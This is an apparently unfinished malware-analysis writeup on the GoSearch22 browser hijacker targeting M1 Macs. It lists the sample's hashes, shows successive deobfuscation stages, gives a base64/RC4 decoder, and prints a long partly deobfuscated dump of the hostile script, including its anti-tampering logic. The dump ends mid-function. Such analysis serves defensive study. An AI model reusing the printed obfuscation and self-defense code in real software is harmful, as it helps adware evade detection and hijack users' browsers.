## GoSearch22
This is a browser hijacker that was re-written to target M1 Macs. It has a file named `script.js` that's heavely obfuscated. A custom build JS sandboxes de-obfuscated some it. The de-obfuscated ouput then passed to jsnice to for more de-obfuscation (This writeup still in progress)

<br /><br />
gosearch22.script.js - info

```
Name 		gosearch22.script.js
md5 		3f620ad553f8865171ccd6ea62c50e09
sha1 		0cddadea7ee54b01942cc5749d2fcfac5c2db1cd
sha256 		a92fbee594b60927af3382d0f180af77862f2382d1a06a8d1cebf5052b03ea7c
ssdeep 		768:hBOCqcZVNQNO3NCOjzXygpyGB+hMnCMzPknvHjsKUbP18Ub:hwC1QN4kkCgvBXCMzPjbPvb
size 		58.81KB
bytes 		60225
mime 		text/plain
extension 	application/javascript
Entropy 	4.903695597744525 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
gosearch22.script.js (before) - T1027 Obfuscated Files or Information

```bash
$ tail 'script.js'
        } else {
            if (a0b('0x169', 'Lv[Q') === a0b('0x106', 'uAqz')) {
                f6['bDFeq'](f7, 0x0);
            } else {
                var fM = document[a0b('0x210', 'j]sZ')];
                fM && f6[a0b('0x76', '2PcE')](f6[a0b('0x21', 'TrXZ')], fM[a0b('0xf3', 'BKpl')][a0b('0x97', 'uAqz')]) && window[a0b('0xd', 'tvLM')][a0b('0x1e3', '[egw')](location[a0b('0x1bc', 'TpDR')]);
            }
        }
    } catch (fN) {}
}
```
<br /><br />
gosearch22.script.js (after 1 attempt)

```bash
$ tail 'script.js' 
      } else {
        var body = document["body"];
        if (body && options["VJQoM"](options["UAcwT"], body["style"]["display"])) {
          window["location"]["replace"](location["href"]);
        }
      }
    }
  } catch (fN) {
  }
}
```
<br /><br />
gosearch22.script.js (after 2 attempts)

```bash
$ tail 'script.js' 
                options.bDFeq(update, 0);
            } else {
                var body = document.body;
                if (body && options.VJQoM(options.UAcwT, body.style.display)) {
                    window.location.replace(location.href);
                }
            }
        }
    } catch (fN) {}
};
```
<br /><br />
gosearch22.script.js (after 3 attempts) 👏👏👏

```bash
$ tail 'script.js' 
                render(0);
            } else {
                var body = document.body;
                if (body && "none" === body.style.display) {
                    window.location.replace(location.href);
                }
            }
        }
    } catch (fN) {}
};
```
<br /><br />
gosearch22.script.js - nodejs de-obfuscated (base64 to utf8, and RC4)

```js
global.atob = require("atob");

function decode_base64_to_utf8(text) {
    return decodeURIComponent(escape(atob(text)));
}

function decode_rc4(key, text) {
    var b = []
    var f = 0
    var c
    var decrypted = "";
    for (var h = 0; h < 256; h++) {
        b[h] = h;
    }
    for (var h = 0; h < 256; h++) {
        f = (f + b[h] + key.charCodeAt(h % key.length)) % 256;
        c = b[h];
        b[h] = b[f];
        b[f] = c;
    }
    h = 0;
    f = 0;
    for (var index = 0; index < text.length; index++) {
        h = (h + 1) % 256;
        f = (f + b[h]) % 256;
        c = b[h];
        b[h] = b[f];
        b[f] = c;

        decrypted = decrypted + String.fromCharCode(text.charCodeAt(index) ^ b[(b[h] + b[f]) % 256]);
    }
    return decrypted;
}
```
<br /><br />
gosearch22.script.js - de-obfuscated on the custom JS sandbox and applied jsnice for more cleanup (attempt 1)

```js
'use strict';
var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=", 
"ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=", 
"w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH", 
"woxnw7vDicO5", "X8OYwpkQw7A=", "wpbCi2oTw4M=", "w4l9w4gubQ==", "w7/DlcKIwrHCrg==", "wpRaw6vDtRY=", "w7YYw74=", "U8KTw4HDjAE=", "ViFMwrDCm2Zq", "XMK8wqM6w4hSwotkw7Eh", "wovDp8Ojw4Bt", "w6fCmsKOZhM=", "FcOuwp8mAl7Cq1PDgMOQ", "I8KJWcOeCl1PPcKANw==", "wooew6hpwqk=", "wqVhw4PCqcK4", "w6w7L0Fe", "b0LDsH9SZTcESW4=", "TcKAw5PCugBXw5J/wobCnw==", "Q0Rgw54o", "wrHDvDbDric=", "wqYAXg18", "w5BQw6sBUg==", "T8O6W2Ye", "wo9Aw7/DpsOp", "TcOOwp3DoQJT", "w7fCqVfCrsOw", "wqAyw455wpg=", "w4jCs3fCpcOV", "CMKoJXDCvw==", 
"a1rDt19K", "w59ew7HDqBRNNsO1w5nCkg==", "bsKHw7rDggbDgWQKw5HDpA==", "woUIw4d+", "wo4DWSZ/", "woxKw6nDuQ8B", "w6wqwpIsHw==", "WVpqw5g=", "wqU+wqvCmSk=", "wodWw63Dq8OP", "JhwKdA==", "ccOzOE12", "woYDwofDpFQ=", "JRcHTiE=", "wo1dwqTDrwgEK8K4woTCmg==", "T8O9wrfDvhw=", "wqbDgzHDlys=", "UyF4wqjDtMOjwrMgcQ==", "RiNVwq3Cgg==", "wroGWTdILMKTc1M=", "QEZjw4c5OzDCpVVi", "d8KDw5bCtsKR", "wqPDt8KCW8KW", "w6sfI1Y=", "wp5zw7DCusOG", "w4wBw79ODB/CpWdyaA==", "DsK2wpDCtAM=", "Q2nDgVVw", "TsOVwpDDrBFJw4k9", "SsK9w4HCgMKD", 
"w4plw7wLDg==", "c8OlOk1d", "wr9Sw67DhsOi", "HsO2w6M7wpg=", "SxnCl8ORwq8=", "a8OIQW8M", "V0LDgEN1", "wqXDgsKxZsKm", "wrPCo1UEw6s4F8OhwofCmQ==", "w5fCuks=", "woHCiXQz", "wpsoXyly", "JsKOwrjCuSg=", "ej/CqcOcwoPCrg==", "VcOvD3g=", "VMKVw7DCn8Kt", "wphvw5vCs8K2Pj9Kw5Bk", "w68kw4Mdaw==", "OcKrIWnCtxYVd1DDpQ==", "w4gRWcKowoPCm8O6wqvDmcOv", "w4vDhjbDtUY=", "wrEcehJW", "bMOyU3IH", "w7sBGMKRwrE=", "fCfCs8ONw4rDoA==", "SStbwpjCm2poHQ==", "wrA3woTCujs=", "wqB6w6bCo8OT", "wqFMTsO0", "QiNdwos=", "McOGwqAY", "CMO3w4U=", 
"wq0XTTdILsKqZ0Ui", "w60Ow4TDtBHDmMO7Ww==", "BjcISAA=", "w4EwJ8KUwqY=", "TsOIZE0HdcKRZQTDgA==", "wqHDtMOBw4FA", "wrhDw7DCnsKa", "dsOUaXUM", "VMOvWWgoRsO6SibDoA==", "wofDtsKtWMKJ", "ATwAOsOv", "IMK5csOVHQ==", "wqwbwrPDkVo=", "YcKDwoQ=", "wofDhxHDpxo=", "b1LDssKhwrvCng==", "w4YRw6zDkAk=", "AcOWwqAOFw==", "YcKIw4PCtMKawrrCosOnMA==", "TMO0w4JRw74=", "acOOWww=", "w6DCvlXCrcOjBsOp", "w6wPw5TDrA==", "w6BCNR8uwqxBMinDig==", "Sx/CtcOawpg=", "wqMXw6J4wrw=", "wp8Vw5PDmwbDoA==", "wp9SRMK0wpLDg8O7wrzDisOh", "UMO8Hn1y", 
"YsO3wpUaw5w=", "w68Fw7ErVcKVwrLDhw==", "ccOTTQ5KwrxxIWtY", "JsKmKWE=", "R8Omw7lOw6JAw7HDg19S", "wp4Dw5F9wokHbA==", "KwQeAMOM", "w43CnsKeRTxB", "LSs9dBw=", "wqVbw5bDvzc=", "w6fCusKsZQRhIzzCo2s=", "cSLCsMOYwpU=", "w7APw5c=", "Z8Kfw5nCosKbwqXCrg==", "UMK1w4fDoA==", "w7PCq1XCrcO7", "w6nDmBDDkw==", "wrTDhyfDvgU=", "w7nCmMKaaiI=", "QsKOw5jDuCY=", "wp9sRcK1wo/CjcOyw73DjsKz", "w6cPw7A/Rg==", "wrTDlETDgRsyDiJkwpg=", "w4fDlsK7wqPCmQ==", "w4cqPldw", "wqLCrRvCn8Ol", "w6HCr0TCtcOnKsOuw7PDoMKY", "PsKsJHzCtF9Rb1E=", 
"w7nCn1TCsMOp", "w6UDw5PDsQvDkg==", "FCEvNMOL", "S8Omw6Nuw5Y=", "JsKOfMObHA==", "w557RMK2wqk=", "woUVw459wokQbB0=", "wrtcUsO3wpzCoHIHTA4=", "IsKUS8OMHQ==", "wprDq8Oow4k=", "wpnCnXEhw5k=", "TsO4HlduVMOI", "wr52w7nCpsKA", "Z8OawpQyw6E=", "wqpew6k=", "wqxTw7TCuMKg", "SMOqaGgS", "w5Iiw5UuaQ==", "wrtGR8OowpjDqg==", "w7gvLRzCkw==", "w5fDkMK8wo/Cpw==", "Mh4bTznCrMOL", "XcOVwpLDpgNSw5AywprCnw==", "UBxswovDiw==", "w6XCtWbCmcOF", "bDtYwpLDtg==", "w60OwqI8Cw==", "w4AJLWBH", "Ox8zAMOCwoDDiBAPw5A=", "JcOIwrwFIXfCkQ==", 
"wrHDnS/DlhQxwoZoFk0=", "w4ohw7PDkTLDuQ==", "dcK3w7zCusKf", "ZcOBw4Vpwocnw5zDo3gS", "wrPCh2oyw4M=", "wrYWwqvDqVA=", "w5fDgcKXwqPCrMK0wo7Ckg==", "HsKOwrLCkiE=", "VcO+wo3DpBw=", "fjzCqMONwo3CrsOP", "w6I8DRfCt8Ox", "NR4ccg==", "W2PDlA==", "S8OCbUgKbcKH", "TcOIwp8=", "dsOtTh1o", "woXCg2s+w4gOK8OCwrg=", "eVXCtw==", "w4poVMKhwog=", "wqh/w4zDnBE=", "w5YhA8KHwqUXw77DswQ=", "RUZg", "w6YZwqQ=", "w5rCgynClg5kFWFqwr8=", "wpYbw5fDjQ/Cp8KnG8KjGw==", "wrlJw7LCgsK6", "bsOPXBFCwrdqEHo=", "w4UIEMKVwo8=", "w4xcw6kAGQrCkCV9dg==", 
"w51hw6YoGg==", "woTCshLCjMK9wpNcw4LClMK7", "wqbDgcKHbMKr", "ZsONRxpOwr4=", "aEfDosKkwrA=", "wrE1w43Dgyg=", "wrx2w57DvcOW", "VsO0w6R9w5U=", "wqtkw7/Ct8OW", "FcOrw5MQwo0=", "dSHCo8OY", "wpUXw4/DrjE=", "w48EEEBQ", "wo3DtsOg", "wosywqDDpGE=", "w708woIrGg==", "Q8K9w4bDvivDtFg=", "w7ovw5AlYw==", "YsOORgtAwr5g", "aE/DrcKtwqbCjWxeLw==", "wpbDt8KHQ8KH", "w4nDtcK7wrbCsg==", "ZlrDrXNn", "wobCnGsuw5o=", "w5F5w64BZg==", "IhMKZSbCmsOSw4AXw58=", "Y8ONw4l+w59xw4fDqWI=", "wrxHWMOz", "RsKKw6HCgcKg", "UiBkwrXDs8Opwr8=", 
"R11tw4Mv", "CcKXSsOPAg==", "woxpwqonCxjCocO7woUq", "MxciaCs=", "wqF0w5rDhsOk", "w6ZDw40jHQ==", "wo3Dly3DiAYw", "UBNdwp/CgQ==", "woUVw5fDmA==", "w5B7w7spTAvDow==", "w4haw4QJdw==", "wpxSw6jDtw==", "wonDgCbDiQ==", "wrnCqEUEw6w=", "w5QhDnc+", "w5zDqhvDqG8=", "w7J8SMKBwo4=", "ZsKHw6bDmwrDkH4bw47DtA==", "IMK5YcOBHg==", "w7AJw4rDvQvDicOq", "KsOCwrwROnM=", "Gg06F8OJ", "w6YecA==", "XFFiw5AoIQ==", "SXHDgVA=", "woxHw73DtwU=", "wpXCqjDCkMOz", "eWVcw58w", "VDRowq3Dvw==", "YyZ6wrLDqA==", "WcOxAlZ2", "ZcOEThFBwrdVF2FO", 
"w49QXcK+woDCisO5wr/Dt8Ky", "QidAwqTDnQ==", "JcKTwpbCgQ7Dq8KnwpN2Kw==", "SMOCaUw8", "JAkbfw==", "wr1GSMOrwozDqn4a", "NMKIwpPCjA==", "w63DnD7DsEM=", "wqfDqMKbVsKYL8Kmw5vDpsKB", "wrHDvQ/DtjQRwqZIGmQ=", "wpDCp2Mpw58=", "wowWwo7DmlVcYQc=", "cTbCqMOZwpbCqg==", "TMOfwo/DpRhOw5Y0wrrClQ==", "w7LDgcK5woDCiA==", "w5zCn07CkcOI", "wogSw4JpwrI=", "w7cQw4vDsRA=", "w4Y0EG5O", "w6ACKEMgwrBU", "woMUw5RCwrI=", "w6gPw4TDuRDDlcOxRg==", "wpdBw6HDvQ==", "c8O8w7h1w60=", "wphOw4LCi8KF", "wqXCqAzCpsOH", "w6gSwo0lPQ==", "FcOqw5E=", 
"w5Erw6Mtaw==", "N8OnGX13XcOnRmHDsw==", "LcKxLWTCplN4b0fDvQ==", "JcKDRMOAKQ==", "w7QtJ8K0wp4=", "wptjw7TDmMOX", "w7nCj8K6Qz8=", "wpPDsMOHw71l", "wpRcw6kVGB3Cu2lrbw==", "w7bCrcKm", "YMORWC5KwqB2DGFQ", "D8KocsO0", "wrtlw4PCi8KkIyFPw6Fo", "w44nwpc+DA==", "wobCtg3CksOs", "w4LCuXTCs8Or", "w6Z9w5MyNCLClwZURA==", "LMKsLHw=", "wpoMwozDgEdcYgU=", "wptgw4fDqRA=", "SMKkw43Ch8K7", "YMKcw6PDmDI=", "wojDtsOjw4Btw70ObEtq", "wrl6fMOhwo0=", "wpfCrzLCssOW", "IA0rMsOX", "HsOFwpEFPQ==", "w6vDiQHDnkY=", "c8K9w57Cl8KX", 
"w6wtwrYOCg==", "dcO3Zm8g", "M1XDtMKpwqHCkG4cLFM=", "wpYGw5TDgAbCusKyB8KT", "woU4QQ==", "wpszWjls", "w41ww643XwfDtA==", "B8O0woEjA17Cq1vDncOA", "w4DDphbDt2o=", "cUPDs8K7wrTCnmg=", "wrMgwqDCpxI=", "bcKew5HCvg==", "YxZgwozCgg==", "w5PDrcKETMKOYg==", "wqYRQApX", "f8OeQEUT", "ARkSw5A=", "PMOdwrcxKQ==", "w5TCusKCSjw=", "VsOOwojDpQQawop+wpnChw==", "w7AIKFQ=", "dMKfw5vCqMKSwqDCp8Ok", "bsOHw499", "QCJTwr7CrQ==", "WMOzHg==", "ATgNJ8Ouwr4=", "w6oEw7YvWcKzwrs=", "wo9Lw4zCm8Oq", "Mh4bRznCvcOUw5scw4Q=", "wq0EWSZD", 
"wrowwq7Dr2xlXyQpwrQ=", "wo8NwofDjVZH", "XMOfwprDugVFw4k+wo/ClA==", "VMOedFYOZMKaZRrDgA==", "I8KhJ2k=", "wpsIw6JJwq8=", "eWwYw5PCsyo=", "VcOyGWo=", "w5UkEGYV", "aMOaw50=", "w7JPw78VZw==", "w77CvkvCpsO2DQ==", "bsO+H213", "wqsqw4ZfwqU=", "wrtpw4PCr8O/JCdHw7d0", "R8O6wr0iw78=", "w6o8BRnCrcO8eMKdZGA=", "wqEIw6JZwoA=", "RiBkwqLDrsOtwrUo", "wpDDq8O/w4Q=", "w6dRw70TfQ==", "SCvCsMO6wqE=", "wrwcw6nDkD4=", "w7XCt2DClcOX", "wqpdw67CtcOf", "w68IKFc7wrQ=", "EsOPwrdWaW/CnHzDocK4", "AcKywo7CpBE=", "FsO3w54Owo7DpMOkw4vCnsOr", 
"AMKHI1XCmA==", "JzQaF8OY", "w5V+w7wuOA==", "woobw5w=", "acKRw4PCssKc", "wq7DkCnDihEsw4RtNg==", "UcO4wrTDkR4=", "aMOPThc=", "w544w6QaEz7DjsKjw6oN", "w6vDjRvDiQ46Un4DwpA=", "V8OreRdi", "wp8oZwpv", "WMOxwqc/w4ZSw5ckwqU=", "w4LCvE3CmMOg", "c0TDqsKtwrbCjQ==", "U8OyHQ==", "wqByw5LCrA==", "MMKyVMOpBA==", "woUIw4J9wp0AbAo=", "w7ktMsKnwoM=", "TSFZwp0=", "OyEtEcOr", "woNow5fCqsOk", "HSIvIsOv", "w4kDLnEM", "w7g+wo4vCQ==", "wp15w6zCvMOQ", "cDLCssOdwoo=", "wpTCshzCisOgw4I=", "wpBfw5zCqsOz", "aMOLYVAu", "w7Vsw6I0LA==", 
"X8OnwqYCw7A=", "w54Rw57DrxQ=", "wqFDw6rClg==", "Q8Ogwr8=", "JiHCo8OKwpfCsMOEwoLDlcKP", "ccKew6TDoQo=", "RixZwpDCgQ==", "FRUtQzk=", "w7vCscKbQBo=", "wqwgw5DCpsK/NTJKwqNy", "IcOQw6Qhwp0=", "wqBYw63Cn8OrYSI=", "dcO8GnlC", "JcKoA2HCqA==", "HjkINsOo", "eTbCoMOXwozCp8O6w5DDicKL", "wrlow5nCvsKG", "w7bDpRvDnHw=", "wrpSw5/DkMOv", "WsO4HlduVMOI", "wrBNTcOuwpfDq0sbQBI=", "YcO0w5h8w5w=", "fnVYw74KDA==", "w4bDjMKUwqXCtcKVwp/CkksI", "wqXCiUAJw7c=", "w71kw5UTUw==", "wpxcw6rDqBQfLcO5w5nDnQ==", "w4Uzw7TDjSnDucOBbT7DnA==", 
"wpYcw4RWwo8=", "w4pcw74OHw==", "w4YPNcKHwps=", "RcOQfgFp", "fgXCrcO5wq8=", "w5xQX8K0wonCj8Ow", "w7LDhwfDvEIi", "w60CMQ==", "W8OwKXlK", "woRHR8O+wp/Dp3cFfBs=", "w68TMH17", "w5fDgcKFwrPCrMKow4vDiEQT", "w4RHw6MPGw==", "QcOdwokEw6A=", "w5hiw6oEKg==", "wonCqRPCmw==", "acOVXAhcw6gqSmNR", "T8O1wr7DoT0=", "w51bw6IVBALCsA==", "w7Mnw7wrcw==", "T8OJeTJm", "wqdsw5bCvsK1Mw==", "w70tERnCrcO+QcKJcg==", "wpnCnl89w4s=", "bT1EwpjDlQ==", "wqYrUS1D", "wqE1w6hkwpE=", "DMK5HlXChg==", "woddw5XDlxA=", "wrovw7dHwrI=", "C8KoJsOoK2B/F8K/Gw==", 
"V8OVwpI=", "a8OHJkpT", "wrDDlEbDgRwyCiJkwpg=", "w74QBTrCkg==", "KcOlwpoyJw==", "w6zDt8K+worCn8KSwq7Cv3Ip", "woBWw6nCnMOI", "fnVYw74KDBvCj0RZ", "wrnDg8Kcf8K0", "wqxUw7/Ciw==", "C8OKw6URwpw=", "w6tlw6svVg==", "w5x6w7AoUQjDtA==", "wpLDv8KDSsKQNcKjw5jDmw==", "w6cTKTbCmg==", "wql/w7fDvxo=", "dFTDpcKu", "wpTDkcKcaMKz", "ZUTDmsKgwqc=", "woHDpsOWw5h6", "w6UQw5fDtB0=", "cMOobTBF", "R8OoZDRwwoJXKkN3", "wpvDtRPDiTo=", "w7QPw4vDoQLDlcOyRCTCmg==", "wp8WwozDkEdHeAgQwpI=", "csOHw4t4w4o=", "eAnCq8OIwoM=", "wpR+w5LCtsOBSRdXwpwh", 
"w7wBwpE7", "TcO4TE0L", "w7srPsKKwqo=", "dRJzwpvDow==", "wqAcQio=", "wqZNWMO3wpbDoGgMewc=", "wp/DtcKSSQ==", "w7/DlcKiwqzCrA==", "woLDgm8ow4sfKMOWwqzDrg==", "wrwcwqzCug==", "NycKMsOr", "UzvCl8O0wqs=", "YsK1w4DCg8K8", "cMO5wr4jw4Q=", "w5fDpTLDm34=", "PcK3MWnCtw==", "ajZOwrjDjw==", "PsKsO3PCsA==", "wpMDeDRU", "Q2zDgE8=", "w7DCusKmag==", "NMKCw5fClEvDlsKgwp5mJA==", "wofDssKvasKX", "w5taU8Ky", "wr8dw4jDuwo=", "w6LCtEnCuMOkDMOgw7U=", "w74twpAnKQ==", "eUDDq8KPwpc=", "NAkD", "Ym54w4AI", "ATgeOsO1wqrDozk6", 
"worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"];
(function(params, content) {
  var fn = function(selected_image) {
    for (; --selected_image;) {
      params["push"](params["shift"]());
    }
  };
  var build = function() {
    var target = {
      "data" : {
        "key" : "cookie",
        "value" : "timeout"
      },
      "setCookie" : function(data, name, uri, headers) {
        headers = headers || {};
        var url = name + "=" + uri;
        var q = 0;
        var i = 0;
        var key = data["length"];
        for (; i < key; i++) {
          var d = data[i];
          url = url + ("; " + d);
          var value = data[d];
          data["push"](value);
          key = data["length"];
          if (value !== !![]) {
            url = url + ("=" + value);
          }
        }
        headers["cookie"] = url;
      },
      "removeCookie" : function() {
        return "dev";
      },
      "getCookie" : function(match, href) {
        match = match || function(canCreateDiscussions) {
          return canCreateDiscussions;
        };
        var v = match(new RegExp("(?:^|; )" + href["replace"](/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
        var test = function(callback, i) {
          callback(++i);
        };
        test(fn, content);
        return v ? decodeURIComponent(v[1]) : undefined;
      }
    };
    var init = function() {
      var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
      return test["test"](target["removeCookie"]["toString"]());
    };
    target["updateCookie"] = init;
    var array = "";
    var k = target["updateCookie"]();
    if (!k) {
      target["setCookie"](["*"], "counter", 1);
    } else {
      if (k) {
        array = target["getCookie"](null, "counter");
      } else {
        target["removeCookie"]();
      }
    }
  };
  build();
})(a0a, 367);
var a0b = function(m, gamma) {
  m = m - 0;
  var l = a0a[m];
  if (a0b["yYCZAh"] === undefined) {
    (function() {
      var unescape = function() {
        var source;
        try {
          source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
        } catch (l) {
          source = window;
        }
        return source;
      };
      var s_utf8 = unescape();
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!s_utf8["atob"]) {
        s_utf8["atob"] = function(i) {
          var str = String(i)["replace"](/=+$/, "");
          var pix_color = "";
          var bc = 0;
          var bs;
          var buffer;
          var Y = 0;
          for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    var testcase = function(data, fn) {
      var result = [];
      var i = 0;
      var word;
      var testResult = "";
      var tempData = "";
      data = atob(data);
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      data = decodeURIComponent(tempData);
      var j;
      j = 0;
      for (; j < 256; j++) {
        result[j] = j;
      }
      j = 0;
      for (; j < 256; j++) {
        i = (i + result[j] + fn["charCodeAt"](j % fn["length"])) % 256;
        word = result[j];
        result[j] = result[i];
        result[i] = word;
      }
      j = 0;
      i = 0;
      var PL$19 = 0;
      for (; PL$19 < data["length"]; PL$19++) {
        j = (j + 1) % 256;
        i = (i + result[j]) % 256;
        word = result[j];
        result[j] = result[i];
        result[i] = word;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](PL$19) ^ result[(result[j] + result[i]) % 256]);
      }
      return testResult;
    };
    a0b["VqQkxC"] = testcase;
    a0b["HXMKWI"] = {};
    a0b["yYCZAh"] = !![];
  }
  var o = a0b["HXMKWI"][m];
  if (o === undefined) {
    if (a0b["avdWvu"] === undefined) {
      var WMCacheControl = function(deny) {
        this["mpnbTz"] = deny;
        this["TQjLvW"] = [1, 0, 0];
        this["dNECWX"] = function() {
          return "newState";
        };
        this["TAlOar"] = "\\w+ *\\(\\) *{\\w+ *";
        this["yLVawE"] = "['|\"].+['|\"];? *}";
      };
      WMCacheControl["prototype"]["VyqkgG"] = function() {
        var test = new RegExp(this["TAlOar"] + this["yLVawE"]);
        var artistTrack = test["test"](this["dNECWX"]["toString"]()) ? --this["TQjLvW"][1] : --this["TQjLvW"][0];
        return this["QKPkcL"](artistTrack);
      };
      WMCacheControl["prototype"]["QKPkcL"] = function(canCreateDiscussions) {
        if (!Boolean(~canCreateDiscussions)) {
          return canCreateDiscussions;
        }
        return this["xCJawF"](this["mpnbTz"]);
      };
      WMCacheControl["prototype"]["xCJawF"] = function(saveNotifs) {
        var fp = 0;
        var len = this["TQjLvW"]["length"];
        for (; fp < len; fp++) {
          this["TQjLvW"]["push"](Math["round"](Math["random"]()));
          len = this["TQjLvW"]["length"];
        }
        return saveNotifs(this["TQjLvW"][0]);
      };
      (new WMCacheControl(a0b))["VyqkgG"]();
      a0b["avdWvu"] = !![];
    }
    l = a0b["VqQkxC"](l, gamma);
    a0b["HXMKWI"][m] = l;
  } else {
    l = o;
  }
  return l;
};
var f = function() {
  var c = !![];
  return function(object__360, function__361) {
    var loopend = c ? function() {
      if (function__361) {
        var cssobj = function__361["apply"](object__360, arguments);
        function__361 = null;
        return cssobj;
      }
    } : function() {
    };
    c = ![];
    return loopend;
  };
}();
var fO = f(this, function() {
  var intval = function() {
    return "dev";
  };
  var getDOMPath = function() {
    return "window";
  };
  var testcase = function() {
    var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
    return !test["test"](intval["toString"]());
  };
  var _stringify = function() {
    var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
    return test["test"](getDOMPath["toString"]());
  };
  var wrap = function(p) {
    var ms_controller = ~-1 >> 1 + 255 % 0;
    if (p["indexOf"]("i" === ms_controller)) {
      create(p);
    }
  };
  var create = function(s) {
    var n = ~-4 >> 1 + 255 % 0;
    if (s["indexOf"]((!![] + "")[3]) !== n) {
      wrap(s);
    }
  };
  if (!testcase()) {
    if (!_stringify()) {
      wrap("ind\u0435xOf");
    } else {
      wrap("indexOf");
    }
  } else {
    wrap("ind\u0435xOf");
  }
});
fO();
var e = function() {
  var _ = {};
  _["fxIxA"] = function(letter, all) {
    return letter == all;
  };
  _["Scusm"] = function(type, imagePixelModule) {
    return type === imagePixelModule;
  };
  _["dKxLT"] = "nWFOv";
  var tileFuncs = _;
  var closeExpr = !![];
  return function(object__360, function__361) {
    var scanKeyPubBytes = {};
    scanKeyPubBytes["uWefn"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["fxIxA"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    scanKeyPubBytes["iJJFY"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["Scusm"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    scanKeyPubBytes["ptPTo"] = tileFuncs["dKxLT"];
    var Q = scanKeyPubBytes;
    var closingExpr = closeExpr ? function() {
      var undefined = {};
      undefined["oUaXQ"] = function(key, itm) {
        return Q["uWefn"](key, itm);
      };
      var extensions = undefined;
      if (function__361) {
        if (Q["iJJFY"](Q["ptPTo"], "XbCss")) {
          var j = $jscomp["propertyTo" + "PolyfillSy" + "mbol"][c];
          if (extensions["oUaXQ"](null, j)) {
            return a[c];
          }
          j = a[j];
          return void 0 !== j ? j : a[c];
        } else {
          var cssobj = function__361["apply"](object__360, arguments);
          function__361 = null;
          return cssobj;
        }
      }
    } : function() {
    };
    closeExpr = ![];
    return closingExpr;
  };
}();
(function() {
  var target = {};
  target["JEoQx"] = "function *" + "( *)";
  target["pCGTJ"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  target["NxPSG"] = "init";
  target["FNcJD"] = function(buckets, name) {
    return buckets + name;
  };
  target["WAvwA"] = "chain";
  target["dtcxZ"] = "input";
  target["fZvbB"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  target["NETsm"] = function(callback, response_2, webhookMsg) {
    return callback(response_2, webhookMsg);
  };
